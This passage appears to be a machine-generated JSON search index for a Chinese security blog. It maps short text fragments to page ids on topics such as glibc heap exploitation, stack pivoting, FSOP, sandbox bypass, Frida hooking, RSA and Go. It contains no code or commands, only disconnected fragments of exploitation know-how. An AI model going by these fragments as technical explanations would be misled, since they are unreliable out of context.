"1\":{\"470\":1}}],[\"那么我们就去free掉chunk\",{\"1\":{\"368\":1}}],[\"那么我们的rsp也成功完成了迁移工作\",{\"1\":{\"446\":1}}],[\"那么我们malloc三次获取我们想要的地址的读写权\",{\"1\":{\"339\":1}}],[\"那么我们如果可以劫持这两个\",{\"1\":{\"431\":1}}],[\"那么我们如果可以伪造reloc\",{\"1\":{\"36\":1,\"176\":1}}],[\"那么我们如何找到它呢\",{\"1\":{\"287\":1}}],[\"那么链表\",{\"1\":{\"339\":1}}],[\"那么输入指令后我们找到了这个chunk\",{\"1\":{\"287\":1}}],[\"那么第八个的地址\",{\"1\":{\"287\":1}}],[\"那么就是libc\",{\"1\":{\"456\":1}}],[\"那么就是我们构造的file结构体\",{\"1\":{\"388\":1}}],[\"那么就很明确了\",{\"1\":{\"296\":1}}],[\"那么就应该多一个第三方来间接转发这个调用\",{\"1\":{\"252\":1}}],[\"那么就满足\",{\"1\":{\"239\":1}}],[\"那么首先就可以很容易想到通过逆推3\",{\"1\":{\"241\":1}}],[\"那么问题来了我们的首先启动的activity究竟是什么\",{\"1\":{\"142\":1}}],[\"那么参数就是三个\",{\"1\":{\"37\":1,\"177\":1}}],[\"那么再根据这个地址进行分页转化\",{\"1\":{\"21\":1,\"163\":1}}],[\"gnu\",{\"1\":{\"456\":1,\"485\":1}}],[\"gdb调试一下\",{\"1\":{\"470\":1}}],[\"gdb使用指令\",{\"1\":{\"390\":1}}],[\"gdb\",{\"0\":{\"333\":1},\"1\":{\"358\":1,\"359\":1,\"369\":1,\"471\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":2,\"484\":1,\"486\":1,\"488\":2,\"491\":1,\"503\":2,\"504\":1,\"505\":1}}],[\"gdt\",{\"1\":{\"21\":1,\"163\":1}}],[\"gather中即可\",{\"1\":{\"282\":1}}],[\"gather\",{\"1\":{\"282\":2}}],[\"gadget链来实现\",{\"1\":{\"446\":1}}],[\"gadget\",{\"1\":{\"131\":2,\"476\":1,\"479\":4,\"481\":1}}],[\"glic\",{\"1\":{\"303\":1}}],[\"glibc高版本加入的fd加密机制\",{\"1\":{\"379\":1,\"501\":1}}],[\"glibc2\",{\"0\":{\"370\":1,\"492\":1},\"1\":{\"378\":1,\"500\":1}}],[\"glibc\",{\"1\":{\"285\":1,\"300\":1,\"303\":1,\"305\":1,\"307\":2,\"312\":8,\"319\":1,\"321\":1,\"324\":4,\"325\":1,\"331\":2,\"342\":1,\"352\":2,\"372\":1,\"382\":1,\"428\":1,\"494\":1}}],[\"glibc在内存的高地址初始化tls\",{\"1\":{\"38\":1,\"178\":1}}],[\"global\",{\"1\":{\"281\":2,\"349\":1,\"353\":1,\"449\":1}}],[\"gender\",{\"1\":{\"369\":3}}],[\"generate\",{\"1\":{\"352\":1}}],[\"generator生成器\",{\"0\":{\"281\":1}}],[\"generator\",{\"1\":{\"278\":1}}],[\"gen\",{\"1\":{\"281\":4}}],[\"gets\",{\"1\":{\"469\":1}}],[\"getdata\",{\"1\":{\"380\":1,\"491\":2,\"502\":1,\"503\":2}}],[\"getdeclaredmethods\",{\"1\":{\"126\":1,\"131\":1}}],[\"get失败则调用arena\",{\"1\":{\"350\":1}}],[\"get2进行分配区的申请与初始化\",{\"1\":{\"351\":1}}],[\"get2中如果分配没有满则调用\",{\"1\":{\"350\":1}}],[\"get2然后arena\",{\"1\":{\"350\":1}}],[\"get2\",{\"0\":{\"352\":1},\"1\":{\"350\":1,\"351\":1,\"352\":1}}],[\"getting\",{\"1\":{\"324\":1,\"339\":1}}],[\"get\",{\"0\":{\"351\":1},\"1\":{\"252\":1,\"258\":1,\"324\":2,\"342\":1,\"350\":1,\"351\":2,\"352\":2,\"358\":2,\"359\":2,\"389\":1,\"390\":3,\"404\":1,\"408\":3,\"459\":1,\"461\":2,\"470\":1}}],[\"getinstance\",{\"1\":{\"134\":1}}],[\"getcursorposition\",{\"0\":{\"137\":1},\"1\":{\"134\":1}}],[\"gcc升级\",{\"1\":{\"256\":1}}],[\"gcd\",{\"1\":{\"242\":4,\"243\":5}}],[\"gmpy2\",{\"1\":{\"243\":3}}],[\"g\",{\"0\":{\"511\":1},\"1\":{\"133\":1,\"281\":5,\"464\":1,\"485\":1}}],[\"grep\",{\"1\":{\"133\":1}}],[\"guestbook\",{\"0\":{\"480\":1}}],[\"guess\",{\"1\":{\"469\":1,\"471\":1}}],[\"gundam\",{\"0\":{\"283\":1}}],[\"guishouflags\",{\"1\":{\"125\":1}}],[\"guishou\",{\"1\":{\"124\":1}}],[\"guanyubo\",{\"1\":{\"43\":1,\"183\":1}}],[\"guard的值\",{\"1\":{\"38\":1,\"178\":1}}],[\"good\",{\"1\":{\"480\":1}}],[\"going\",{\"1\":{\"324\":2,\"339\":1}}],[\"go检测websocket连接是否存在\",{\"1\":{\"255\":1}}],[\"go检测websocket链接是否存在\",{\"0\":{\"255\":1}}],[\"gorilla\",{\"1\":{\"254\":1}}],[\"go中建立websocket\",{\"0\":{\"254\":1}}],[\"go\",{\"1\":{\"253\":2,\"254\":1,\"324\":1}}],[\"go的websocket\",{\"0\":{\"253\":1}}],[\"golang\",{\"0\":{\"512\":1},\"1\":{\"252\":1}}],[\"go后台项目架构思考与重构\",{\"1\":{\"244\":1}}],[\"go后台架构设计浅学习\",{\"0\":{\"244\":1}}],[\"got表和plt表详细解说\",{\"0\":{\"449\":1}}],[\"goto\",{\"1\":{\"339\":3,\"352\":1}}],[\"got\",{\"1\":{\"36\":1,\"176\":1,\"449\":3,\"475\":1}}],[\"go语言讲解深拷贝与浅拷贝\",{\"1\":{\"30\":1,\"172\":1}}],[\"go底层\",{\"0\":{\"22\":1,\"164\":1}}],[\"gift\",{\"1\":{\"491\":3,\"503\":1}}],[\"given\",{\"1\":{\"324\":1}}],[\"git\",{\"0\":{\"274\":1,\"514\":1},\"1\":{\"272\":2,\"273\":2,\"274\":3}}],[\"git代码提交规范\",{\"1\":{\"263\":1}}],[\"git提交规范\",{\"0\":{\"263\":1}}],[\"gitbooks\",{\"1\":{\"22\":1,\"164\":1}}],[\"github\",{\"1\":{\"1\":2,\"40\":2,\"46\":2,\"49\":1,\"53\":1,\"180\":2,\"186\":2,\"189\":1,\"193\":1,\"254\":1,\"272\":1,\"398\":2,\"437\":2}}],[\"giraffe\",{\"1\":{\"1\":1}}],[\"giraffexiu\",{\"1\":{\"1\":2}}],[\"交给软中断来处理\",{\"1\":{\"20\":1,\"162\":1}}],[\"与less类似\",{\"1\":{\"464\":1}}],[\"与got\",{\"1\":{\"449\":1}}],[\"与chun2\",{\"1\":{\"365\":1}}],[\"与安全检查\",{\"1\":{\"321\":1}}],[\"与bk\",{\"1\":{\"296\":1}}],[\"与\",{\"0\":{\"263\":1},\"1\":{\"250\":1,\"312\":1}}],[\"与硬中断不同\",{\"1\":{\"20\":1,\"162\":1}}],[\"与row\",{\"0\":{\"8\":1,\"150\":1}}],[\"缺页异常\",{\"1\":{\"20\":1,\"162\":1}}],[\"软引用用于描述一些有用但不是必须的对象\",{\"1\":{\"82\":1,\"222\":1}}],[\"软中断更类似于注册了一个对象列表\",{\"1\":{\"20\":1,\"162\":1}}],[\"软中断之分\",{\"1\":{\"20\":1,\"162\":1}}],[\"软件中断\",{\"1\":{\"20\":1,\"162\":1}}],[\"软件应用的写时复制\",{\"1\":{\"9\":1,\"151\":1}}],[\"硬中断更像是响应\",{\"1\":{\"20\":1,\"162\":1}}],[\"硬中断是每完成一个生命周期后都会去检测一下有没有中断信号\",{\"1\":{\"20\":1,\"162\":1}}],[\"硬中断也就是中断异常这类\",{\"1\":{\"20\":1,\"162\":1}}],[\"硬中断\",{\"1\":{\"20\":1,\"162\":1}}],[\"中被使用\",{\"1\":{\"449\":1}}],[\"中push\",{\"1\":{\"449\":1}}],[\"中一条链已经存在一个无效的chunk地址\",{\"1\":{\"380\":1,\"502\":1}}],[\"中记录前一个\",{\"1\":{\"312\":1}}],[\"中bk值\",{\"1\":{\"306\":1}}],[\"中的一个函数\",{\"1\":{\"458\":1}}],[\"中的这个n\",{\"1\":{\"451\":1}}],[\"中的\",{\"1\":{\"422\":1}}],[\"中的显示前一个\",{\"1\":{\"312\":1}}],[\"中的num获取chunk的size\",{\"1\":{\"288\":1}}],[\"中的空闲\",{\"1\":{\"284\":1}}],[\"中合要去除的commit\",{\"1\":{\"273\":1}}],[\"中删除提交\",{\"1\":{\"272\":1}}],[\"中领域思想\",{\"1\":{\"244\":1}}],[\"中出现了调用原本的函数\",{\"1\":{\"122\":1}}],[\"中间代码生成\",{\"0\":{\"94\":1,\"234\":1}}],[\"中cr3主要是存储页目录的物理地址\",{\"1\":{\"75\":1,\"215\":1}}],[\"中\",{\"1\":{\"46\":1,\"186\":1,\"324\":1,\"449\":3}}],[\"中进行处理\",{\"1\":{\"43\":1,\"183\":1}}],[\"中a\",{\"1\":{\"24\":1,\"166\":1}}],[\"中寻找基地址\",{\"1\":{\"21\":1,\"163\":1}}],[\"中寻找段选择子和段内偏移\",{\"1\":{\"21\":1,\"163\":1}}],[\"中断是异步的\",{\"1\":{\"20\":1,\"162\":1}}],[\"中断还有\",{\"1\":{\"20\":1,\"162\":1}}],[\"中止\",{\"1\":{\"20\":1,\"162\":1}}],[\"中内存管理\",{\"0\":{\"5\":1,\"148\":1}}],[\"信号中断\",{\"0\":{\"19\":1,\"161\":1}}],[\"重复上一次搜索\",{\"1\":{\"464\":2}}],[\"重要知识点\",{\"0\":{\"284\":1}}],[\"重构代码\",{\"1\":{\"265\":1}}],[\"重构的几种模式\",{\"1\":{\"244\":1}}],[\"重载方法的个数\",{\"1\":{\"123\":1}}],[\"重写add方法\",{\"1\":{\"121\":1}}],[\"重打包\",{\"1\":{\"73\":1,\"213\":1}}],[\"重新调整堆栈指针\",{\"1\":{\"47\":1,\"187\":1}}],[\"重新向mmu发出执行该task的写操作\",{\"1\":{\"9\":1,\"151\":1}}],[\"重定向\",{\"0\":{\"18\":1,\"160\":1}}],[\"机制\",{\"0\":{\"286\":1},\"1\":{\"17\":1,\"159\":1,\"286\":1}}],[\"对value变量xor\",{\"1\":{\"460\":1}}],[\"对面会返回我已经收到\",{\"1\":{\"433\":1}}],[\"对\",{\"0\":{\"431\":1},\"1\":{\"321\":1}}],[\"对next\",{\"1\":{\"312\":1}}],[\"对特定情况进行单独处理\",{\"1\":{\"252\":1}}],[\"对正整数n\",{\"1\":{\"240\":1}}],[\"对类名进行过滤\",{\"1\":{\"126\":1}}],[\"对应\",{\"1\":{\"491\":1}}],[\"对应page总数\",{\"1\":{\"438\":1}}],[\"对应js的写法\",{\"1\":{\"124\":1}}],[\"对应的物理空间不一定连续\",{\"1\":{\"16\":1,\"158\":1}}],[\"对象\",{\"1\":{\"13\":1,\"155\":1}}],[\"该结构体指定了新线程的属性\",{\"1\":{\"458\":1}}],[\"该函数主要创建\",{\"1\":{\"353\":1}}],[\"该变量保存对应的分配区\",{\"1\":{\"351\":1}}],[\"该地址的相对偏移值存放在libc\",{\"1\":{\"284\":1}}],[\"该区域由vmalloc进行分配\",{\"1\":{\"16\":1,\"158\":1}}],[\"该处理器去取数据时\",{\"1\":{\"12\":1,\"154\":1}}],[\"前6号占满\",{\"1\":{\"491\":1}}],[\"前一个chunk的指针\",{\"1\":{\"295\":1}}],[\"前四个参数都是r0\",{\"1\":{\"47\":1,\"187\":1}}],[\"前10位获取页目录项从而定位到页目录再通过中12位获取页目录中第几项获取其基础地址然后加上最后10位偏移地址获取真实的地址\",{\"1\":{\"21\":1,\"163\":1}}],[\"前\",{\"1\":{\"16\":1,\"158\":1}}],[\"胡总和说性能损失巨大\",{\"1\":{\"16\":1,\"158\":1}}],[\"所需chunk大小在smallbin的范围之内\",{\"1\":{\"313\":1}}],[\"所有的文件流\",{\"0\":{\"425\":1}}],[\"所有\",{\"1\":{\"252\":1}}],[\"所有业务逻辑都交给其他层级进行处理\",{\"1\":{\"252\":1}}],[\"所有执行i\",{\"1\":{\"15\":2,\"157\":2}}],[\"所谓\",{\"1\":{\"240\":1}}],[\"所引用的父类变量都不能在栈上分配\",{\"1\":{\"31\":1,\"173\":1}}],[\"所以构造一个0x1603d00被free的情况\",{\"1\":{\"491\":1}}],[\"所以可以泄露大量信息\",{\"1\":{\"489\":1}}],[\"所以才改后缀为py\",{\"1\":{\"463\":1}}],[\"所以参与下面加密函数的value值为\",{\"1\":{\"461\":1}}],[\"所以参考文章\",{\"1\":{\"262\":1}}],[\"所以说这个变量是开发的时候编译使用\",{\"1\":{\"453\":1}}],[\"所以就重新了解一下patchelf的使用参考文章\",{\"1\":{\"452\":1}}],[\"所以就是+4\",{\"1\":{\"47\":1,\"187\":1}}],[\"所以总结一下\",{\"1\":{\"451\":1}}],[\"所以got\",{\"1\":{\"449\":1}}],[\"所以go的函数调用参数和返回值都是依赖于栈进行传递的\",{\"1\":{\"29\":1,\"171\":1}}],[\"所以还会更长\",{\"1\":{\"433\":1}}],[\"所以重点分析这里\",{\"1\":{\"425\":1}}],[\"所以此时整条链是\",{\"1\":{\"417\":1}}],[\"所以指针本身值可以被修改\",{\"1\":{\"399\":1}}],[\"所以最终调用了\",{\"1\":{\"384\":1}}],[\"所以最小的在链表最后\",{\"1\":{\"319\":1}}],[\"所以需要gdb手动调试计算出偏差\",{\"1\":{\"378\":1,\"500\":1}}],[\"所以为了方便控制\",{\"1\":{\"376\":1,\"498\":1}}],[\"所以尝试其他思路\",{\"1\":{\"358\":1}}],[\"所以当执行完ret后整个程序流程就跑到了read\",{\"1\":{\"446\":1}}],[\"所以当unsortedbin只有一个chunk的时候那么fd和bk都指向了main\",{\"1\":{\"357\":1}}],[\"所以当调用对象的函数或者属性的时候\",{\"1\":{\"84\":1,\"224\":1}}],[\"所以来学习一下基本功学习文章\",{\"1\":{\"326\":1}}],[\"所以也就是fwd\",{\"1\":{\"325\":1}}],[\"所以也就是如果知道了e和phi\",{\"1\":{\"241\":1}}],[\"所以fwd\",{\"1\":{\"325\":2}}],[\"所以fork函数采用了cow技术\",{\"1\":{\"16\":1,\"158\":1}}],[\"所以\",{\"1\":{\"319\":1,\"329\":1}}],[\"所以bck改为链表最后一位\",{\"1\":{\"319\":1}}],[\"所以largebin的fd和bk和其他的双向链不同我们不能通过从bin一路通过fd返回到large\",{\"1\":{\"308\":1}}],[\"所以进行阅读源码\",{\"1\":{\"308\":1}}],[\"所以一但我们劫持了victim的bk后\",{\"1\":{\"306\":1}}],[\"所以一般不会这样简单\",{\"1\":{\"241\":1}}],[\"所以每个元素\",{\"1\":{\"292\":1}}],[\"所以结构体属性就是下一个chunk的指针\",{\"1\":{\"286\":1}}],[\"所以转使用docker\",{\"1\":{\"259\":1}}],[\"所以这里我们是需要构造第二个fake\",{\"1\":{\"446\":1}}],[\"所以这里的设计了一个vtable\",{\"1\":{\"401\":1}}],[\"所以这里\",{\"1\":{\"400\":1}}],[\"所以这里学习docker构造指定版本的libc环境参考文章\",{\"1\":{\"256\":1}}],[\"所以这些变量都是在堆上分配的\",{\"1\":{\"31\":1,\"173\":1}}],[\"所以观察者模式就是多设计一个中间人一样的接口\",{\"1\":{\"250\":1}}],[\"所以建议直接食用原文\",{\"1\":{\"244\":1}}],[\"所以利用扩展欧几里得算法\",{\"1\":{\"243\":1}}],[\"所以ed\",{\"1\":{\"242\":1}}],[\"所以知道了p和q就知道了phi\",{\"1\":{\"241\":1}}],[\"所以等价为\",{\"1\":{\"240\":1}}],[\"所以c=me\",{\"1\":{\"240\":1}}],[\"所以c\",{\"1\":{\"240\":1}}],[\"所以找到d本质上是对ex+yφ\",{\"1\":{\"240\":1}}],[\"所以a就等于0\",{\"1\":{\"239\":1}}],[\"所以a的p次方也是p的倍数\",{\"1\":{\"239\":1}}],[\"所以我有点想直接覆盖数据为11\",{\"1\":{\"469\":1}}],[\"所以我就自然想到了这题先利用overlapping\",{\"1\":{\"302\":1}}],[\"所以我就决定自己写一个程序来完成这个工作并且好好理解一下怎么计算的\",{\"1\":{\"288\":1}}],[\"所以我选择自己拿ubuntu16\",{\"1\":{\"262\":1}}],[\"所以我在这里选择的是\",{\"1\":{\"258\":1}}],[\"所以我带上参数\",{\"1\":{\"131\":1}}],[\"所以我们构造size和prev\",{\"1\":{\"491\":1}}],[\"所以我们要构造好这个chunk\",{\"1\":{\"491\":1}}],[\"所以我们要精心构造一个chunk\",{\"1\":{\"361\":1}}],[\"所以我们直接劫持head\",{\"1\":{\"490\":1}}],[\"所以我们直接进行git\",{\"1\":{\"276\":1}}],[\"所以我们只需要把寄存器的值改变就实现了栈迁移\",{\"1\":{\"446\":1}}],[\"所以我们的\",{\"1\":{\"417\":1}}],[\"所以我们的vtable直接填写这三个中任意一个即可\",{\"1\":{\"395\":1}}],[\"所以我们得想办法绕过\",{\"1\":{\"394\":1}}],[\"所以我们得先填充满tcache\",{\"1\":{\"357\":1}}],[\"所以我们下一次double\",{\"1\":{\"380\":1,\"502\":1}}],[\"所以我们double\",{\"1\":{\"378\":1,\"500\":1}}],[\"所以我们选择触发fastbin的合并\",{\"1\":{\"374\":1,\"496\":1}}],[\"所以我们需要后续的malloc\",{\"1\":{\"378\":1,\"500\":1}}],[\"所以我们需要构造一个double\",{\"1\":{\"378\":1,\"500\":1}}],[\"所以我们需要一个alloced\",{\"1\":{\"358\":1}}],[\"所以我们需要overload标明参数\",{\"1\":{\"123\":1}}],[\"所以我们一般把tcache填满来绕过\",{\"1\":{\"340\":1}}],[\"所以我们一般通过额外的一些信息来进行安全攻击\",{\"1\":{\"241\":1}}],[\"所以我们取第二个\",{\"1\":{\"321\":1}}],[\"所以我们为了不额外修改chunk\",{\"1\":{\"319\":1}}],[\"所以我们就在每个加密函数里面打idapython的脚本\",{\"1\":{\"461\":1}}],[\"所以我们就是看是否malloc的大小\",{\"1\":{\"289\":1}}],[\"所以我们就不带这个了\",{\"1\":{\"131\":1}}],[\"所以我们可以清楚的知道哪些数据是成功收到的哪些数据是失败的\",{\"1\":{\"433\":1}}],[\"所以我们可以将\",{\"1\":{\"395\":1}}],[\"所以我们可以将n因式分解就可以得到pq然后得到phin\",{\"1\":{\"241\":1}}],[\"所以我们可以对一个index无限malloc\",{\"1\":{\"371\":1,\"493\":1}}],[\"所以我们可以构造fd为ptr\",{\"1\":{\"345\":1}}],[\"所以我们可以采用外部依赖接口化\",{\"1\":{\"245\":1}}],[\"所以我们可以通过\",{\"1\":{\"69\":1,\"209\":1}}],[\"所以我们其实可以在callback函数里面用this\",{\"1\":{\"122\":1}}],[\"所以我们如果可以伪造这个vtable然后指向我们的可控区域\",{\"1\":{\"79\":1,\"219\":1}}],[\"所以我们如果可以修改cr4的值\",{\"1\":{\"74\":1,\"214\":1}}],[\"所以相对而言简单一些\",{\"1\":{\"70\":1,\"210\":1}}],[\"所以其他线程也会更随着崩溃\",{\"1\":{\"66\":1,\"206\":1}}],[\"所以单独拿出来\",{\"1\":{\"53\":1,\"193\":1}}],[\"所以直接使用公式\",{\"1\":{\"289\":1}}],[\"所以直接\",{\"1\":{\"40\":1,\"180\":1}}],[\"所以修改新对象\",{\"1\":{\"30\":1,\"172\":1}}],[\"所以在开发者最初设想中\",{\"1\":{\"399\":1}}],[\"所以在这里系统学习一下git的代码提交规范\",{\"1\":{\"263\":1}}],[\"所以在callback函数中我们的操作对象是每一个对象\",{\"1\":{\"125\":1}}],[\"所以在\",{\"1\":{\"24\":1,\"166\":1}}],[\"所以在禁用了1情况下可以通过重定向到0\",{\"1\":{\"18\":1,\"160\":1}}],[\"所以会在响应后\",{\"1\":{\"20\":1,\"162\":1}}],[\"所以文件描述符也是操作的对应一样的文件\",{\"1\":{\"16\":1,\"158\":1}}],[\"父对象被称之为原型对象\",{\"1\":{\"84\":1,\"224\":1}}],[\"父进程的栈堆代码等段信息\",{\"1\":{\"16\":1,\"158\":1}}],[\"父子进程之所以能够通过\",{\"1\":{\"13\":1,\"155\":1}}],[\"有一个gift函数\",{\"1\":{\"489\":1}}],[\"有一些很容易想要的一些利用方式这里就不单独列出来了\",{\"1\":{\"53\":1,\"193\":1}}],[\"有格式化\",{\"1\":{\"476\":1}}],[\"有了这个就阻止了我们double\",{\"1\":{\"372\":1,\"494\":1}}],[\"有点做不动heap的题\",{\"1\":{\"326\":1}}],[\"有错误的地方请大佬指正\",{\"1\":{\"307\":1}}],[\"有大佬已经写好了\",{\"1\":{\"262\":1}}],[\"有办法通过公钥\",{\"1\":{\"241\":1}}],[\"有无限个\",{\"1\":{\"240\":1}}],[\"有时候fork可以带来一些新的思路\",{\"1\":{\"16\":1,\"158\":1}}],[\"有关\",{\"1\":{\"16\":1,\"158\":1}}],[\"栈的指针寄存器\",{\"1\":{\"446\":1}}],[\"栈迁移+float数据格式\",{\"0\":{\"469\":1}}],[\"栈迁移核心\",{\"0\":{\"446\":1}}],[\"栈迁移的大致操作\",{\"0\":{\"445\":1}}],[\"栈迁移\",{\"0\":{\"444\":1},\"1\":{\"486\":1}}],[\"栈25$处的值是0x100\",{\"1\":{\"39\":1,\"179\":1}}],[\"栈向下增长\",{\"1\":{\"38\":1,\"178\":1}}],[\"栈\",{\"1\":{\"16\":1,\"158\":1}}],[\"堆地址>>12然后\",{\"1\":{\"491\":1}}],[\"堆管理器用brk或者mmap函数去获取内存\",{\"1\":{\"328\":1}}],[\"堆管理器\",{\"0\":{\"327\":1},\"1\":{\"327\":1}}],[\"堆特性\",{\"1\":{\"326\":1}}],[\"堆结构学习\",{\"1\":{\"326\":1}}],[\"堆结构\",{\"1\":{\"287\":1}}],[\"堆指针\",{\"1\":{\"82\":1,\"222\":1}}],[\"堆喷\",{\"0\":{\"80\":1,\"220\":1}}],[\"堆利用\",{\"0\":{\"53\":1,\"193\":1}}],[\"堆\",{\"1\":{\"16\":1,\"158\":1}}],[\"论fork\",{\"1\":{\"16\":1,\"158\":1}}],[\"可进行largebin\",{\"1\":{\"383\":1}}],[\"可喜可贺\",{\"1\":{\"368\":1}}],[\"可能是处于低端或者高端的内存中\",{\"1\":{\"16\":1,\"158\":1}}],[\"可以直接让一个文件描述符的内容输出到另一个文件描述符上非常适合平替这次的write函数\",{\"1\":{\"483\":1}}],[\"可以直接进入docker内部\",{\"1\":{\"258\":1}}],[\"可以向上翻页\",{\"1\":{\"464\":1}}],[\"可以传递\",{\"1\":{\"458\":1}}],[\"可以查看当前libc和ld的版本\",{\"1\":{\"455\":1}}],[\"可以得到libc\",{\"1\":{\"455\":1}}],[\"可以粗俗得当作一个属于\",{\"1\":{\"451\":1}}],[\"可以一对多\",{\"1\":{\"433\":1}}],[\"可以发现和我们的fp一模一样\",{\"1\":{\"417\":1}}],[\"可以发现就是塞满了各种函数\",{\"1\":{\"414\":1}}],[\"可以发现\",{\"1\":{\"388\":1,\"417\":1,\"431\":1}}],[\"可以发现fd\",{\"1\":{\"311\":1}}],[\"可以实现任意free\",{\"1\":{\"380\":1,\"502\":1}}],[\"可以快速定位到合适大小的空闲chunk\",{\"1\":{\"347\":1}}],[\"可以通过use\",{\"1\":{\"284\":1}}],[\"可以通过检查\",{\"1\":{\"255\":1}}],[\"可以通过fork让\",{\"1\":{\"15\":1,\"157\":1}}],[\"可以使得ed被φ\",{\"1\":{\"240\":1}}],[\"可以将密码分为对称密码和公钥密码\",{\"1\":{\"238\":1}}],[\"可以构造多个同名字的函数\",{\"1\":{\"123\":1}}],[\"可以列出来\",{\"1\":{\"109\":1}}],[\"可以用于查看和编辑文件内容\",{\"1\":{\"464\":1}}],[\"可以用\",{\"1\":{\"73\":1,\"213\":1}}],[\"可以打fsop\",{\"1\":{\"60\":1,\"200\":1}}],[\"可以互不影响\",{\"1\":{\"15\":1,\"157\":1}}],[\"可从管道中接收数据\",{\"1\":{\"13\":1,\"155\":1}}],[\"博客园\",{\"1\":{\"15\":1,\"43\":1,\"103\":1,\"140\":1,\"143\":1,\"157\":1,\"183\":1,\"246\":1,\"252\":1,\"307\":2,\"450\":1,\"452\":1}}],[\"锦瑟\",{\"1\":{\"15\":1,\"157\":1}}],[\"它告诉\",{\"1\":{\"466\":1}}],[\"它的资源不会立即被操作系统回收\",{\"1\":{\"458\":1}}],[\"它的文件描述符会是3\",{\"1\":{\"15\":1,\"157\":1}}],[\"它是一组接口\",{\"1\":{\"434\":1}}],[\"它是可以通过\",{\"1\":{\"69\":1,\"209\":1}}],[\"它将当前\",{\"1\":{\"324\":1}}],[\"它又称为φ函数\",{\"1\":{\"240\":1}}],[\"它能够抵抗到目前为止已知的绝大多数密码攻击\",{\"1\":{\"238\":1}}],[\"它没有自己的原型对象\",{\"1\":{\"84\":1,\"224\":1}}],[\"它可以实现进程之间的通信和数据传输\",{\"1\":{\"4\":1,\"147\":1}}],[\"os\",{\"1\":{\"463\":2}}],[\"os=\",{\"1\":{\"369\":2,\"473\":2,\"475\":3,\"479\":2,\"480\":2,\"481\":2,\"482\":2,\"483\":1,\"484\":3,\"485\":1,\"486\":2,\"488\":3,\"491\":2,\"503\":2,\"504\":2,\"505\":2}}],[\"our\",{\"1\":{\"417\":1}}],[\"outbufend\",{\"1\":{\"408\":2}}],[\"outbuf\",{\"1\":{\"408\":2}}],[\"out\",{\"1\":{\"124\":1,\"125\":1,\"324\":1,\"408\":1}}],[\"owner\",{\"1\":{\"408\":1}}],[\"other\",{\"1\":{\"324\":1}}],[\"otherwise\",{\"1\":{\"324\":1,\"339\":1,\"347\":1}}],[\"olang\",{\"0\":{\"511\":1}}],[\"old2\",{\"1\":{\"324\":4,\"339\":4}}],[\"old\",{\"1\":{\"324\":9,\"339\":12,\"378\":2,\"408\":1,\"410\":1,\"456\":1,\"500\":2}}],[\"ol4three\",{\"1\":{\"132\":1}}],[\"ok\",{\"1\":{\"324\":1,\"352\":1}}],[\"overflow的调用\",{\"0\":{\"395\":1}}],[\"overflow调用\",{\"0\":{\"394\":1}}],[\"overflow可以知道fp\",{\"1\":{\"388\":1}}],[\"overflow\",{\"0\":{\"387\":1},\"1\":{\"388\":1,\"391\":1,\"394\":2,\"395\":10,\"397\":1,\"401\":2}}],[\"overflow函数\",{\"1\":{\"384\":1,\"387\":1,\"395\":1}}],[\"overall\",{\"1\":{\"286\":1}}],[\"overlap\",{\"1\":{\"294\":1}}],[\"overlapping\",{\"1\":{\"55\":1,\"195\":1}}],[\"overlength=student\",{\"1\":{\"123\":1}}],[\"overloads\",{\"1\":{\"123\":3}}],[\"overload\",{\"1\":{\"123\":1}}],[\"orw\",{\"1\":{\"505\":1}}],[\"orw+exit\",{\"0\":{\"503\":1}}],[\"orw沙箱绕过总结\",{\"0\":{\"40\":1,\"180\":1}}],[\"org\",{\"1\":{\"307\":1}}],[\"orig\",{\"1\":{\"439\":2,\"441\":2}}],[\"orientation\",{\"1\":{\"410\":3}}],[\"ori\",{\"1\":{\"273\":1}}],[\"or\",{\"1\":{\"261\":2,\"324\":9,\"339\":1,\"352\":1,\"378\":1,\"500\":1}}],[\"op\",{\"1\":{\"369\":2}}],[\"option\",{\"1\":{\"333\":2}}],[\"options\",{\"1\":{\"131\":1,\"464\":4}}],[\"optimization\",{\"1\":{\"307\":1}}],[\"open+read的长度\",{\"1\":{\"505\":1}}],[\"open64\",{\"1\":{\"503\":1}}],[\"open函数\",{\"1\":{\"420\":1}}],[\"open函数来打开\",{\"1\":{\"420\":1}}],[\"openat\",{\"1\":{\"40\":1,\"180\":1}}],[\"open\",{\"1\":{\"40\":2,\"77\":1,\"180\":2,\"217\":1,\"258\":2}}],[\"objection基本操作与实战\",{\"1\":{\"132\":1}}],[\"objection\",{\"0\":{\"132\":1},\"1\":{\"132\":1}}],[\"object\",{\"1\":{\"131\":2}}],[\"obj\",{\"1\":{\"125\":4,\"450\":1}}],[\"oo设计的原则及设计过程的全面总结\",{\"1\":{\"252\":1}}],[\"oo设计原则\",{\"1\":{\"252\":2}}],[\"oops=panic\",{\"1\":{\"73\":1,\"213\":1}}],[\"oom主要是根据进程的得分来进行评估是否要杀掉\",{\"1\":{\"69\":1,\"209\":1}}],[\"oom\",{\"0\":{\"69\":1,\"209\":1},\"1\":{\"69\":5,\"209\":5}}],[\"oom机制\",{\"0\":{\"68\":1,\"208\":1}}],[\"off64\",{\"1\":{\"389\":1}}],[\"off\",{\"0\":{\"345\":1},\"1\":{\"127\":1,\"300\":1}}],[\"off=0x7078\",{\"1\":{\"127\":1}}],[\"offset是一个绝对地址\",{\"1\":{\"451\":1}}],[\"offset变为了\",{\"1\":{\"420\":1}}],[\"offset\",{\"1\":{\"127\":1,\"305\":1,\"312\":1,\"313\":1,\"315\":1,\"321\":2,\"324\":9,\"339\":4,\"389\":1,\"408\":3,\"417\":1,\"426\":2,\"428\":2,\"451\":2}}],[\"of\",{\"0\":{\"56\":1,\"59\":1,\"60\":1,\"196\":1,\"199\":1,\"200\":1,\"304\":1,\"381\":1,\"384\":1,\"393\":1},\"1\":{\"286\":1,\"290\":1,\"324\":10,\"339\":5,\"347\":4,\"352\":1,\"369\":2,\"382\":3,\"390\":9,\"393\":1,\"397\":1,\"408\":9,\"417\":1,\"438\":2,\"470\":2}}],[\"of系列总结\",{\"1\":{\"53\":1,\"193\":1}}],[\"o\",{\"1\":{\"43\":1,\"73\":1,\"183\":1,\"213\":1}}],[\"o操作的系统调用都通过文件描述符来实现\",{\"1\":{\"15\":1,\"157\":1}}],[\"only\",{\"1\":{\"324\":1,\"339\":1,\"445\":1}}],[\"onleave\",{\"1\":{\"127\":1}}],[\"one漏洞覆写bk\",{\"1\":{\"366\":1}}],[\"one漏洞来实现修改fd\",{\"1\":{\"365\":1}}],[\"one漏洞\",{\"1\":{\"300\":1,\"301\":1,\"480\":1,\"488\":1}}],[\"one\",{\"0\":{\"345\":1,\"487\":1},\"1\":{\"286\":1,\"324\":1,